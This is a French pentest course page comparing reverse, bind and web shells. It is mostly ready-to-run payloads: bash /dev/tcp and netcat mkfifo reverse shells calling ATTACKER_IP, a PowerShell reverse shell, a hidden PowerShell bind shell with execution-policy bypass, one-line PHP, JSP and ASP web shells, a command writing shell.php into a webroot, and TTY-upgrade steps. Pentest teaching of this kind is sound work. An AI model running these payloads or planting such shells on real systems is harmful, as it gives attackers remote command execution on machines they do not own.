# Types de shells

[<< Précédent : Exploits publics](04-exploits-publics.md) | [Suivant : Élévation de privileges >>](06-elevation-de-privileges.md)

---

## Comparaison

| Type | Fonctionnement | Qui écoute |
|------|---------------|------------|
| **Reverse shell** | La cible se connecte à l'attaquant | L'attaquant (`nc -lvnp`) |
| **Bind shell** | La cible ouvre un port, l'attaquant s'y connecte | La cible |
| **Web shell** | Script sur le serveur web, commandes via HTTP | Le serveur web |

---

## Reverse shell (le plus courant)

L'attaquant met en place un listener, puis exploite la cible pour qu'elle se connecte en retour.

```bash
# 1) Listener sur notre machine
nc -lvnp 1234

# 2) Commande exécutée sur la cible (Linux - bash)
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'

# Alternative avec netcat (plus fiable sur certaines distros)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f
```

```powershell
# Reverse shell PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

**Avantage** : rapide, fiable, contourne le firewall entrant.
**Inconvénient** : si la connexion tombe, il faut re-exploiter.

---

## Bind shell

La cible ouvre un port et l'attaquant s'y connecte.

```bash
# Sur la cible (Linux)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

# Connexion depuis l'attaquant
nc TARGET_IP 1234
```

```powershell
# Bind shell PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

**Avantage** : on peut se reconnecter si la connexion tombe (tant que le processus tourne).
**Inconvénient** : nécessite un port ouvert sur la cible (souvent bloqué par le firewall).

---

## Web shell

Script déposé sur le serveur web qui exécute des commandes via des paramètres HTTP.

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

**Webroots par défaut :**

| Serveur | Chemin |
|---------|--------|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

```bash
# Écrire un webshell
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

# Exécuter une commande
curl http://TARGET_IP/shell.php?cmd=id
```

**Avantage** : passe par le port web (80/443), survit aux redémarrages.
**Inconvénient** : pas interactif, pas de TTY.

---

## Upgrade TTY (critique)

Un reverse/bind shell brut ne permet pas d'utiliser `su`, `sudo`, les éditeurs, ni l'historique de commandes. Il faut l'upgrader :

```bash
# Étape 1 : spawn un pseudo-terminal
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Étape 2 : backgrounder le shell
# Appuyer sur Ctrl+Z

# Étape 3 : configurer notre terminal local
stty raw -echo
fg
# Appuyer sur Entree x2

# Étape 4 : configurer le terminal distant
export TERM=xterm-256color
stty rows 67 columns 318    # adapter à votre terminal
```

Pour connaître les valeurs rows/columns, ouvrir un autre terminal et taper :

```bash
echo $TERM        # -> xterm-256color
stty size          # -> 67 318 (rows columns)
```

> Voir [cheatsheet reverse-shells](../../../cheatsheets/reverse-shells.md) pour tous les payloads.
